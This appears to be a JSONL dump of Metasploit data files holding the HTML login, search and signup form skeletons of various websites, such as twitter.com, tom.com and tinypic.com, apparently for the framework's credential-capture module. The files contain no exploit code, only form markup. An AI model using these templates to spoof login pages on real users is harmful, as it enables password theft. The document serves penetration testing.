name=\"registrySearchFormName\" type=\"hidden\" value=\"\" /><input name=\"firstName\" title=\"First Name\" class=\"GN_NAV2DD_GR_TL_TEXT\" type=\"text\" id=\"firstName\" alt=\"first name\" /><input name=\"lastName\" title=\"Last Name\" class=\"GN_NAV2DD_GR_TL_TEXT\" type=\"text\" id=\"lastName\" alt=\"last name\" /></form><form name='findlist' action='/lists/find?ref=nav_listfind2' method='post'> <input name=\"registrySearchFormName\" type=\"hidden\" value=\"\" /><input name=\"firstName\" title=\"First Name\" class=\"GN_NAV2DD_GR_TL_TEXT\" type=\"text\" id=\"firstName\" alt=\"first name\" /><input name=\"lastName\" title=\"Last Name\" class=\"GN_NAV2DD_GR_TL_TEXT\" type=\"text\" id=\"lastName\" alt=\"last name\" /></form><form title='Email Sign Up' action='https://sites.target.com/site/en/spot/page.jsp?title=email_sign_up&ref=nav_footer_email' method='post' onsubmit='window.open(, emailWindow, width=335,height=340,scrollbars=yes,locationbar=no,menubar=no,personalbar=no,status=no,toolbar=no,resizable=yes)' target='emailWindow'> <input name=\"emailId\" class=\"input_txt\" type=\"text\" id=\"emailId\" /><input title=\"Go - will open a new window\" src=\"\" type=\"image\" value=\"\" alt=\"Go - will open a new window\" /></form>", "timestamp": "2025-10-24T23:41:30.038466"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/taringa.net.txt", "content": "<form action='/login.php' method='post'> <input name=\"nick\" size=\"10\" class=\"ilogin\" type=\"text\" maxlength=\"64\" style=\"font-size:10px\" /><input name=\"pass\" size=\"10\" class=\"ilogin\" type=\"password\" maxlength=\"64\" style=\"font-size:10px\" /><input class=\"login\" title=\"Ingresar\" type=\"submit\" value=\"\" style=\"font-size:10px\" /></form><form action='/buscador.php' method='get' style='margin: 0px; padding: 0px;'> <input name=\"q\" size=\"20\" class=\"ibuscador\" type=\"text\" /><input class=\"bbuscador\" title=\"Buscar\" type=\"image\" src=\"\" vspace=\"2\" hspace=\"10\" onclick=\"this.form.submit()\" align=\"top\" alt=\"Buscar\" /></form>", "timestamp": "2025-10-24T23:41:30.398918"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/teacup.com.txt", "content": "<form name='teacup_search_form' action='http://find.teacup.com/bbssearch' method='get' id='teacup_search_form' target='_blank'> <input name=\"query\" type=\"text\" id=\"teacup_search_input\" value=\"\" style=\"width:300px\" /><input name=\"encode\" type=\"hidden\" value=\"\" /><input type=\"submit\" value=\"\" style=\"width:150px;\" /></form><form name='form_mobaile' action='/cgi-bin/urlmail.cgi' method='post' target='_blank'> <input name=\"submit\" type=\"submit\" value=\"\" /><input name=\"mtype\" type=\"hidden\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:30.719659"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/technorati.com.txt", "content": "<form action='/query.php' method='post'> <input name=\"q\" type=\"text\" id=\"search\" value=\"\" /><input type=\"submit\" value=\"\" /><input name=\"type\" type=\"hidden\" value=\"\" /></form><form action='/login.php' method='post'> <input name=\"username\" size=\"16\" type=\"text\" id=\"signin-membername\" maxlength=\"255\" /><input name=\"password\" size=\"16\" type=\"password\" id=\"signin-password\" maxlength=\"255\" /><input type=\"submit\" value=\"\" /></form><form action='/signup/' method='post'> <input name=\"username\" size=\"16\" type=\"text\" id=\"join-membername\" maxlength=\"255\" /><input name=\"email\" size=\"16\" type=\"text\" id=\"join-email\" maxlength=\"255\" /><input name=\"password\" size=\"16\" type=\"password\" id=\"join-password\" maxlength=\"255\" /><input name=\"cpassword\" size=\"16\" type=\"password\" id=\"join-confirm\" maxlength=\"255\" /><input name=\"tos\" type=\"checkbox\" id=\"join-accept\" value=\"\" /><input name=\"func\" type=\"hidden\" value=\"\" /><input name=\"destination\" type=\"hidden\" value=\"\" /><input type=\"submit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:31.044164"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/terra.com.br.txt", "content": "<form name='form_buscadores' action='http://buscador.terra.com.br/default.aspx' method='get' onsubmit='return(BValidar());' lang='atmors'> <input name=\"ca\" type=\"hidden\" value=\"\" /><input name=\"source\" type=\"hidden\" value=\"\" /><input name=\"query\" class=\"buscbox2\" type=\"text\" maxlength=\"70\" /><input name=\"Image\" type=\"Image\" src=\"\" hspace=\"2\" align=\"absmiddle\" /></form><form name='Enquetecapa' action='http://enquete.noticias.terra.com.br/enquete.cgi' method='POST' onsubmit='enquete(enqresult);' lang='atmors' target='enqresult'> <input name=\"id_enquete\" type=\"hidden\" value=\"\" /><input name=\"opcao\" type=\"radio\" border=\"0\" value=\"\" /><input name=\"opcao\" type=\"radio\" border=\"0\" value=\"\" /><input name=\"enviar\" type=\"image\" src=\"\" border=\"0\" /></form>", "timestamp": "2025-10-24T23:41:31.384297"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/thefreedictionary.com.txt", "content": "<form name='f1' action='http://www.thefreedictionary.com/_/search.aspx' method='get' id='f1' style='margin: 12px 0 6px 0'> <input name=\"tab\" type=\"hidden\" value=\"\" /><input name=\"SearchBy\" checked type=\"radio\" id=\"f1_tfd\" value=\"\" onclick=\"_SearchBy(this)\" style=\"margin-left:-4px\" /><input name=\"SearchBy\" type=\"radio\" id=\"f1_Google\" value=\"\" onclick=\"_SearchBy(this)\" /><input name=\"SearchBy\" type=\"radio\" id=\"f1_YellowPages\" value=\"\" onclick=\"_SearchBy(this)\" /><input name=\"SearchBy\" type=\"radio\" id=\"f1_WhitePages\" value=\"\" onclick=\"_SearchBy(this)\" /><input name=\"SearchBy\" type=\"radio\" id=\"f1_eBay\" value=\"\" onclick=\"_SearchBy(this)\" /><input name=\"SearchBy\" type=\"radio\" id=\"f1_Amazon\" value=\"\" onclick=\"_SearchBy(this)\" /><input name=\"Word\" size=\"60\" value=\"\" ondblclick=\"click_block=1\" /><input name=\"Search\" type=\"submit\" value=\"\" /><input name=\"TFDBy\" checked type=\"radio\" id=\"f1_tfd_word\" value=\"\" onclick=\"_SearchBy(this)\" style=\"margin-left:-4px\" /><input name=\"TFDBy\" type=\"radio\" id=\"f1_tfd_start\" value=\"\" onclick=\"_SearchBy(this)\" /><input name=\"TFDBy\" type=\"radio\" id=\"f1_tfd_end\" value=\"\" onclick=\"_SearchBy(this)\" /><input name=\"TFDBy\" type=\"radio\" id=\"f1_tfd_text\" value=\"\" onclick=\"_SearchBy(this)\" /></form><form name='fHP' action='' method='post' id='fHP' style='display:inline;'> <input name=\"__VIEWSTATE\" type=\"hidden\" id=\"__VIEWSTATE\" value=\"\" /><input name=\"CA$CP$hnb\" type=\"hidden\" id=\"CA_CP_hnb\" /><input name=\"CA$CP$tbCustomRSSUrl\" size=\"17\" type=\"text\" id=\"CA_CP_tbCustomRSSUrl\" /><input name=\"CA$CP$btnCustomRSSAdd\" type=\"button\" id=\"CA_CP_btnCustomRSSAdd\" value=\"\" onclick=\"return addCustomRSSBlock()\" /><input name=\"CA$CP$hdCustomRSS\" type=\"hidden\" id=\"CA_CP_hdCustomRSS\" /><input name=\"CA$WTHR_0$ctl04$txtLoc\" type=\"text\" id=\"CA_WTHR_0_ctl04_txtLoc\" value=\"\" onchange=\"CSParameterChange(this, 'value', 'New+York%2c+NY');\" /><input name=\"CA$WTHR_0$ctl05$txtBGColor\" size=\"7\" type=\"text\" id=\"CA_WTHR_0_ctl05_txtBGColor\" value=\"\" onchange=\"this.style.backgroundColor=this.value\" maxlength=\"20\" style=\"background-color:White;\" /><input name=\"CA$WTHR_0$ctl07$rdDegreeUnit\" checked=\"checked\" type=\"radio\" id=\"CA_WTHR_0_ctl07_rdUnitF\" value=\"\" onclick=\"CSParameterChange(this, 'checked', 'True');\" /><input name=\"CA$WTHR_0$ctl07$rdDegreeUnit\" type=\"radio\" id=\"CA_WTHR_0_ctl07_rdUnitC\" value=\"\" /><input name=\"CA$WTHR_0$btnSave\" type=\"submit\" id=\"CA_WTHR_0_btnSave\" value=\"\" onclick=\"return checkForUnsavedParameters(this.id);\" style=\"float:right\" /><input name=\"CA$WOD_0$ctl04$txtBGColor\" size=\"7\" type=\"text\" id=\"CA_WOD_0_ctl04_txtBGColor\" value=\"\" onchange=\"this.style.backgroundColor=this.value\" maxlength=\"20\" style=\"background-color:White;\" /><input name=\"CA$WOD_0$btnSave\" type=\"submit\" id=\"CA_WOD_0_btnSave\" value=\"\" onclick=\"return checkForUnsavedParameters(this.id);\" style=\"float:right\" /><input name=\"CA$AOD_0$ctl04$txtBGColor\" size=\"7\" type=\"text\" id=\"CA_AOD_0_ctl04_txtBGColor\" value=\"\" onchange=\"this.style.backgroundColor=this.value\" maxlength=\"20\" style=\"background-color:White;\" /><input name=\"CA$AOD_0$btnSave\" type=\"submit\" id=\"CA_AOD_0_btnSave\" value=\"\" onclick=\"return checkForUnsavedParameters(this.id);\" style=\"float:right\" /><input name=\"CA$ITN_0$ctl04$txtBGColor\" size=\"7\" type=\"text\" id=\"CA_ITN_0_ctl04_txtBGColor\" value=\"\" onchange=\"this.style.backgroundColor=this.value\" maxlength=\"20\" style=\"background-color:White;\" /><input name=\"CA$ITN_0$btnSave\" type=\"submit\" id=\"CA_ITN_0_btnSave\" value=\"\" onclick=\"return checkForUnsavedParameters(this.id);\" style=\"float:right\" /><input name=\"CA$DIH_0$ctl04$txtBGColor\" size=\"7\" type=\"text\" id=\"CA_DIH_0_ctl04_txtBGColor\" value=\"\" onchange=\"this.style.backgroundColor=this.value\" maxlength=\"20\" style=\"background-color:White;\" /><input name=\"CA$DIH_0$btnSave\" type=\"submit\" id=\"CA_DIH_0_btnSave\" value=\"\" onclick=\"return checkForUnsavedParameters(this.id);\" style=\"float:right\" /><input name=\"CA$TB_0$ctl04$txtBGColor\" size=\"7\" type=\"text\" id=\"CA_TB_0_ctl04_txtBGColor\" value=\"\" onchange=\"this.style.backgroundColor=this.value\" maxlength=\"20\" style=\"background-color:White;\" /><input name=\"CA$TB_0$btnSave\" type=\"submit\" id=\"CA_TB_0_btnSave\" value=\"\" onclick=\"return checkForUnsavedParameters(this.id);\" style=\"float:right\" /><input name=\"CA$WLIST_0$ctl04$txtBGColor\" size=\"7\" type=\"text\" id=\"CA_WLIST_0_ctl04_txtBGColor\" value=\"\" onchange=\"this.style.backgroundColor=this.value\" maxlength=\"20\" style=\"background-color:#FAFCFE;\" /><input name=\"CA$WLIST_0$btnSave\" type=\"submit\" id=\"CA_WLIST_0_btnSave\" value=\"\" onclick=\"return checkForUnsavedParameters(this.id);\" style=\"float:right\" /><input name=\"CA$HM_0$ctl04$txtBGColor\" size=\"7\" type=\"text\" id=\"CA_HM_0_ctl04_txtBGColor\" value=\"\" onchange=\"this.style.backgroundColor=this.value\" maxlength=\"20\" style=\"background-color:White;\" /><input name=\"CA$HM_0$btnSave\" type=\"submit\" id=\"CA_HM_0_btnSave\" value=\"\" onclick=\"return checkForUnsavedParameters(this.id);\" style=\"float:right\" /><input name=\"hm_input\" size=\"2\" id=\"tfd_hm_input\" onkeyup=\"tfd_hm_init(0);tfd_hm_update()\" onclick=\"tfd_hm_init(0)\" style=\"border:1px black solid;width:16pt;text-align:center;font:normal 12pt 'Courier New'\" /><input name=\"CA$SB_0$ctl04$txtBGColor\" size=\"7\" type=\"text\" id=\"CA_SB_0_ctl04_txtBGColor\" value=\"\" onchange=\"this.style.backgroundColor=this.value\" maxlength=\"20\" style=\"background-color:White;\" /><input name=\"CA$SB_0$btnSave\" type=\"submit\" id=\"CA_SB_0_btnSave\" value=\"\" onclick=\"return checkForUnsavedParameters(this.id);\" style=\"float:right\" /><input name=\"level\" type=\"radio\" id=\"tfd_bee_level1\" value=\"\" onclick=\"tfd_level_click(this)\" /><input name=\"level\" checked type=\"radio\" id=\"tfd_bee_level2\" value=\"\" onclick=\"tfd_level_click(this)\" /><input name=\"level\" type=\"radio\" id=\"tfd_bee_level3\" value=\"\" onclick=\"tfd_level_click(this)\" /><input size=\"12\" class=\"tfd_bee_na\" type=\"text\" id=\"tfd_bee_uword\" /><input type=\"button\" value=\"\" onclick=\"tfd_bee_answer()\" /><input type=\"button\" value=\"\" onclick=\"tfd_bee_new()\" /><input name=\"CA$MUP_0$ctl04$txtBGColor\" size=\"7\" type=\"text\" id=\"CA_MUP_0_ctl04_txtBGColor\" value=\"\" onchange=\"this.style.backgroundColor=this.value\" maxlength=\"20\" style=\"background-color:White;\" /><input name=\"CA$MUP_0$btnSave\" type=\"submit\" id=\"CA_MUP_0_btnSave\" value=\"\" onclick=\"return checkForUnsavedParameters(this.id);\" style=\"float:right\" /><input type=\"button\" value=\"\" onclick=\"mu_clear()\" /><input type=\"Button\" value=\"\" onclick=\"mu_submit()\" /><input name=\"CA$QOD_0$ctl04$txtBGColor\" size=\"7\" type=\"text\" id=\"CA_QOD_0_ctl04_txtBGColor\" value=\"\" onchange=\"this.style.backgroundColor=this.value\" maxlength=\"20\" style=\"background-color:White;\" /><input name=\"CA$QOD_0$btnSave\" type=\"submit\" id=\"CA_QOD_0_btnSave\" value=\"\" onclick=\"return checkForUnsavedParameters(this.id);\" style=\"float:right\" /><input name=\"CA$HOR_0$ctl04$txtBGColor\" size=\"7\" type=\"text\" id=\"CA_HOR_0_ctl04_txtBGColor\" value=\"\" onchange=\"this.style.backgroundColor=this.value\" maxlength=\"20\" style=\"background-color:White;\" /><input name=\"CA$HOR_0$btnSave\" type=\"submit\" id=\"CA_HOR_0_btnSave\" value=\"\" onclick=\"return checkForUnsavedParameters(this.id);\" style=\"float:right\" /><input name=\"CA$sh\" type=\"hidden\" id=\"CA_sh\" /><input name=\"saveAllParameters\" type=\"hidden\" id=\"saveAllParameters\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:31.723749"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/thepiratebay.org.txt", "content": "<form name='q' action='/s/' method='get'> <input name=\"q\" title=\"Pirate Search\" type=\"text\" style=\"margin:6px;width: 390px;\" /><input checked=\"checked\" type=\"checkbox\" id=\"all\" onclick=\"javascript:setAll();\" /><input name=\"audio\" type=\"checkbox\" id=\"audio\" onclick=\"javascript:rmAll();\" /><input name=\"video\" type=\"checkbox\" id=\"video\" onclick=\"javascript:rmAll();\" /><input name=\"apps\" type=\"checkbox\" id=\"apps\" onclick=\"javascript:rmAll();\" /><input name=\"games\" type=\"checkbox\" id=\"games\" onclick=\"javascript:rmAll();\" /><input name=\"other\" type=\"checkbox\" id=\"other\" onclick=\"javascript:rmAll();\" /><input name=\"searchTitle\" type=\"checkbox\" id=\"searchTitle\" /><input title=\"Pirate Search\" type=\"submit\" value=\"\" /><input name=\"lucky\" title=\"I'm Feeling Lucky\" type=\"submit\" value=\"\" /><input name=\"page\" type=\"hidden\" value=\"\" /><input name=\"orderby\" type=\"hidden\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:32.058223"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/tianya.cn.txt", "content": "<form name='login' method='post' id='login'> <input name=\"vwriter\" size=\"12\" class=\"inp\" onmouseover=\"this.style.backgroundColor = '#E5F0FF'\" id=\"text1\" onmouseout=\"this.style.backgroundColor='#ffffff'\" maxlength=\"16\" /><input name=\"vpassword\" size=\"12\" class=\"inp\" type=\"password\" onmouseover=\"this.style.backgroundColor = '#E5F0FF'\" id=\"password1\" onmouseout=\"this.style.backgroundColor='#ffffff'\" maxlength=\"18\" /><input name=\"button1\" class=\"inp\" type=\"button\" onmouseover=\"this.style.backgroundColor='#E5F0FF'\" id=\"button1\" value=\"\" onmouseout=\"this.style.backgroundColor='#ffffff'\" onclick=\"javascript:check_data();\" /></form>", "timestamp": "2025-10-24T23:41:32.728985"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/tinypic.com.txt", "content": "<form name='signinForm' action='http://tinypic.com//login.php' id='signinForm' method='POST' onsubmit='return verifyLoginForm(document.signinForm);'> <input name=\"action\" type=\"hidden\" value=\"\" /><input name=\"ref\" type=\"hidden\" value=\"\" /><input name=\"email\" class=\"input-text\" type=\"text\" id=\"email\" value=\"\" maxlength=\"150\" /><input name=\"password\" class=\"input-text\" type=\"password\" id=\"password\" value=\"\" maxlength=\"150\" /><input type=\"submit\" id=\"submitSignIn\" value=\"\" /></form><form action='http://tinypic.com/search.php' id='search' method='get'> <input name=\"type\" type=\"hidden\" value=\"\" /><input name=\"tag\" size=\"18\" type=\"text\" value=\"\" /><input type=\"submit\" value=\"\" /></form><form name='upload_form' enctype='multipart/form-data' action='http://s3.tinypic.com/upload.php' method='post' id='uploadForm' target='upload_iframe'> <input name=\"UPLOAD_IDENTIFIER\" type=\"hidden\" value=\"\" /><input name=\"upk\" type=\"hidden\" value=\"\" /><input name=\"domain_lang\" type=\"hidden\" value=\"\" /><input name=\"action\" type=\"hidden\" value=\"\" /><input name=\"MAX_FILE_SIZE\" type=\"hidden\" value=\"\" /><input name=\"the_file\" size=\"25\" type=\"file\" id=\"the_file\" /><input name=\"description\" size=\"25\" class=\"input-text\" type=\"text\" id=\"description\" maxlength=\"250\" /><input name=\"file_type\" checked=\"checked\" class=\"input-radio\" type=\"radio\" id=\"file_type_image\" value=\"\" onclick=\"showResizeOption();\" /><input name=\"file_type\" class=\"input-radio\" type=\"radio\" id=\"file_type_video\" value=\"\" onclick=\"hideResizeOption();\" /></form><form class='right' action='' id='language'> </form>", "timestamp": "2025-10-24T23:41:33.074637"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/tom.com.txt", "content": "<form action='http://pass.tom.com/dologin.php' id='loginForm' method='post' onsubmit='return PassUtils.checkLogin();'> <input name=\"tomid\" class=\"txtin\" type=\"text\" id=\"tomid\" value=\"\" onfocus=\"if(this.value=='\u8f93\u5165\u90ae\u7bb1')this.value='';this.style.color='black';\" style=\"color:gray;\" onblur=\"PassUtils.autoComplete('tomid')\" /><input name=\"tompwd\" class=\"txtin\" type=\"password\" id=\"tompwd\" value=\"\" onfocus=\"if(this.value=='\u8f93\u5165\u5bc6\u7801')this.value='';this.style.color='black';\" style=\"color:gray;\" /><input name=\"issave\" checked=\"checked\" type=\"checkbox\" value=\"\" /><input name=\"\" class=\"submit\" type=\"submit\" value=\"\" /><input name=\"svcid\" type=\"hidden\" value=\"\" /><input name=\"backurl\" type=\"hidden\" id=\"backurl\" value=\"\" /></form><form action='http://www.google.cn/search' id='searchForm' method='get' onsubmit='return document.getElementById(searchKeyword).value!=;' target='_blank'> <input name=\"q\" class=\"sinput web\" type=\"text\" id=\"searchKeyword\" maxlength=\"255\" onblur=\"shareSearchText(this.value);\" /><input class=\"schbtn\" type=\"submit\" value=\"\" /><input name=\"client\" type=\"hidden\" value=\"\" /><input name=\"ie\" type=\"hidden\" value=\"\" /><input name=\"oe\" type=\"hidden\" value=\"\" /><input name=\"hl\" type=\"hidden\" value=\"\" /><input name=\"channel\" type=\"hidden\" value=\"\" /></form><form action='Http://search.tom.com/t.php?channel=all&stype=0' method='get' target='_blank'> <input name=\"w\" class=\"sinput\" type=\"text\" id=\"searchKeyword2\" onblur=\"shareSearchText(this.value);\" /><input class=\"schbtn\" type=\"submit\" value=\"\" /></form><form action='http://pic.tom.com/search.php' method='get' target='_blank'> <input name=\"word\" class=\"sinput\" type=\"text\" id=\"searchKeyword3\" onblur=\"shareSearchText(this.value);\" /><input class=\"schbtn\" type=\"submit\" value=\"\" /></form><form action='http://search.tom.com/s.php' id='searchForm' onsubmit='return document.getElementById(searchKeyword4).value!=;' target='_blank'> <input name=\"w\" class=\"sinput\" type=\"text\" id=\"searchKeyword4\" onblur=\"shareSearchText(this.value);\" /><input class=\"schbtn\" type=\"submit\" value=\"\" onclick=\"document.getElementById('searchEdt').value=1;\" /><input name=\"edt\" type=\"hidden\" id=\"searchEdt\" /></form>", "timestamp": "2025-10-24T23:41:33.410151"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/torrentreactor.net.txt", "content": "<form action='/profile.php' method='post'> <input name=\"action\" type=\"hidden\" value=\"\" /><input name=\"username\" class=\"input-text\" type=\"text\" id=\"username\" /><input name=\"passwd\" class=\"input-text\" type=\"password\" id=\"password\" /><input type=\"image\" src=\"\" border=\"0\" height=\"25\" alt=\"Login\" width=\"26\" style=\"width:26px; height:25px; border:none;\" /></form><form action='/search.php' id='searchform' method='get' onsubmit='if (cid.value==10) {cid.value = 0; this.action=http://www.bushtorrent.com/torrents.php?search=&}else if (cid.value==11) {cid.value = 0; this.action=http://covers.torrentreactor.net/search.php} else if (cid.value==12) {this.action=/software.php;}'> <input name=\"words\" class=\"input-text\" type=\"text\" /><input name=\"search\" type=\"hidden\" /><input class=\"button-image\" type=\"image\" src=\"\" alt=\"Search\" /></form><form action='' method='GET' id='LangForm'> </form>", "timestamp": "2025-10-24T23:41:33.779331"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/tripod.com.txt", "content": "<form action='/adm/redirect/www/bin/membership/login' method='get'> <input name=\"reflect\" type=\"hidden\" value=\"\" /><input name=\"u\" class=\"text\" type=\"text\" value=\"\" /><input name=\"p\" class=\"text\" type=\"password\" value=\"\" /><input name=\"submit\" type=\"image\" src=\"\" value=\"\" /></form><form action='http://tripod.domains.lycos.com/bin/domain_search' method='post'> <input name=\"domain\" type=\"text\" maxlength=\"32\" style=\"width: 85px; vertical-align: top;\" /><input name=\"Go!\" type=\"submit\" value=\"\" style=\"vertical-align: top;\" /></form>", "timestamp": "2025-10-24T23:41:34.751367"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/tu.tv.txt", "content": "<form name='login' action='/' method='POST'> <input name=\"USUARIO\" size=\"15\" type=\"text\" value=\"\" onfocus=\"if \r\n(this.value == 'Usuario') this.value = '';\" /><input name=\"PASSWORD\" size=\"15\" type=\"password\" value=\"\" onfocus=\"if  (this.value == 'Clave') this.value = '';\" /><input name=\"submit\" type=\"submit\" value=\"\" /><input name=\"FORMULARIO\" type=\"hidden\" value=\"\" /><input name=\"URL_REFERER\" type=\"hidden\" value=\"\" /><input name=\"RECORDAR\" type=\"hidden\" value=\"\" /></form><form action='/buscar/' method='get'> <input name=\"BUSCADOR\" size=\"30\" type=\"text\" value=\"\" /><input type=\"submit\" value=\"\" /></form><form name='login' action='/' method='POST'> <input name=\"USUARIO\" size=\"30\" type=\"text\" id=\"usuario\" value=\"\" /><input name=\"PASSWORD\" size=\"30\" type=\"password\" id=\"clave\" value=\"\" /><input name=\"submitClienteValidar\" class=\"boton\" type=\"submit\" value=\"\" /><input name=\"RECORDAR\" checked type=\"checkbox\" value=\"\" style=\"margin:0px\" /><input name=\"FORMULARIO\" type=\"hidden\" value=\"\" /></form><form name='nafb' action='http://buscar.hispavista.com/' id='idfb' method='GET'> <input name=\"cadena\" size=\"67\" class=\"caja\" type=\"text\" id=\"cadena\" /><input name=\"Submit\" class=\"buscar_pie\" type=\"submit\" value=\"\" /><input name=\"oculto\" type=\"hidden\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:35.422279"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/tudou.com.txt", "content": "<form class='nav_searchform' action='http://so.tudou.com/isearch.do' method='get' target='_blank'> <input name=\"kw\" class=\"nav_searchInput\" type=\"text\" accesskey=\"s\" value=\"\" onclick=\"return false;\" /><input class=\"postBtn\" type=\"submit\" value=\"\" /></form><form action='#' style='display:none;'> <input class=\"googleBtn\" type=\"submit\" value=\"\" /><input name=\"client\" type=\"hidden\" value=\"\" /><input name=\"channel\" type=\"hidden\" value=\"\" /></form><form class='nav_searchform' action='http://so.tudou.com/isearch.do' method='get' target='_blank'> <input name=\"kw\" class=\"nav_searchInput\" type=\"text\" accesskey=\"s\" value=\"\" onclick=\"return false;\" /><input class=\"postBtn\" type=\"submit\" value=\"\" /></form><form action='#' style='display:none;'> <input class=\"googleBtn\" type=\"submit\" value=\"\" /><input name=\"client\" type=\"hidden\" value=\"\" /><input name=\"channel\" type=\"hidden\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:35.755293"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/tv.com.txt", "content": "<form name='login' action='http://authorize.tv.com/1324-4-90.html?tag=login;login' method='post'> <input name=\"EMAILADDR\" type=\"text\" /><input name=\"PASSWORD\" type=\"password\" /><input name=\"path\" type=\"hidden\" value=\"\" /><input type=\"submit\" style=\"position:absolute;left:-5000px;top:-1000px;\" /></form><form name='searchform' action='http://www.tv.com/search.php?tag=search;button' onsubmit='return validateSearch(searchform);'> <input name=\"qs\" type=\"text\" value=\"\" onblur=\"if(this.value=='')this.value='';\" /><input name=\"type\" type=\"hidden\" value=\"\" /><input name=\"stype\" type=\"hidden\" value=\"\" /><input name=\"tag\" type=\"hidden\" value=\"\" /><input name=\"om_act\" type=\"hidden\" value=\"\" /><input name=\"om_clk\" type=\"hidden\" value=\"\" /></form><form name='myshows_login' action='http://authorize.tv.com/1324-4-90.html?tag=recent;register;login' method='post'> <input name=\"EMAILADDR\" type=\"text\" style=\"width:75%;\" /><input name=\"PASSWORD\" type=\"password\" style=\"width:75%;\" /><input name=\"path\" type=\"hidden\" value=\"\" /><input type=\"submit\" style=\"position:absolute;left:-5000px;width:50px;\" /></form><form name='poll' action='http://www.tv.com/index.php?type=29&action=vote&tag=poll;button' method='post'> <input name=\"poll_id\" type=\"hidden\" value=\"\" /><input name=\"choice_id\" type=\"radio\" value=\"\" /><input name=\"choice_id\" type=\"radio\" value=\"\" /><input name=\"choice_id\" type=\"radio\" value=\"\" /><input name=\"choice_id\" type=\"radio\" value=\"\" /><input name=\"choice_id\" type=\"radio\" value=\"\" /><input name=\"choice_id\" type=\"radio\" value=\"\" /><input name=\"choice_id\" type=\"radio\" value=\"\" /><input name=\"choice_id\" type=\"radio\" value=\"\" /><input name=\"choice_id\" type=\"radio\" value=\"\" /><input name=\"choice_id\" type=\"radio\" value=\"\" /><input name=\"submit\" type=\"image\" src=\"\" /></form><form name='searchform2' action='http://www.tv.com/search.php?tag=footsearch;button'> <input name=\"qs\" type=\"text\" id=\"searchtext2\" value=\"\" onfocus=\"this.className='on';\" onblur=\"this.className='';\" /><input name=\"type\" type=\"hidden\" value=\"\" /><input name=\"stype\" type=\"hidden\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:36.094785"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/twitter.com.txt", "content": "<form action='/sessions/change_locale' id='lf' method='post' style='margin-top:2px'> <input name=\"authenticity_token\" type=\"hidden\" value=\"\" /></form><form action='https://twitter.com/sessions' method='post' id='signin'> <input name=\"session[username_or_email]\" title=\"username\" type=\"text\" id=\"username\" value=\"\" /><input name=\"session[password]\" title=\"password\" type=\"password\" id=\"password\" value=\"\" /><input name=\"remember_me\" type=\"checkbox\" id=\"remember\" value=\"\" /><input type=\"submit\" id=\"signin_submit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:36.396703"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/ucoz.ru.txt", "content": "<form action='http://s0.ucoz.net/umain/sub/' method='post'> <input name=\"user\" size=\"20\" class=\"loginField\" title=\"\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044c\" type=\"text\" style=\"width:80px;\" maxlength=\"15\" /><input name=\"password\" size=\"20\" class=\"loginField\" title=\"\u043f\u0430\u0440\u043e\u043b\u044c\" type=\"password\" style=\"width:80px;\" maxlength=\"15\" /><input type=\"image\" src=\"\" height=\"16\" width=\"48\" /><input name=\"host\" type=\"hidden\" value=\"\" /><input name=\"a\" type=\"hidden\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:36.723660"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/ultimate-guitar.com.txt", "content": "<form action='http://ultimate-guitar.com/forum/login.php' method='post' onsubmit='md5hash(vb_login_password,vb_login_md5password,vb_login_md5password_utf)' style='margin:0px'> <input name=\"s\" type=\"hidden\" value=\"\" /><input name=\"do\" type=\"hidden\" value=\"\" /><input name=\"forceredirect\" type=\"hidden\" value=\"\" /><input name=\"vb_login_md5password\" type=\"hidden\" /><input name=\"vb_login_md5password_utf\" type=\"hidden\" /><input name=\"cookieuser\" type=\"hidden\" value=\"\" /><input name=\"vb_login_username\" size=\"15\" id=\"navbar_username\" /><input name=\"vb_login_password\" size=\"15\" type=\"password\" /><input type=\"submit\" value=\"\" /></form><form action='/search.php' style='margin:0px'> <input name=\"s\" size=\"25\" /><input class=\"submit\" type=\"submit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:37.068006"}
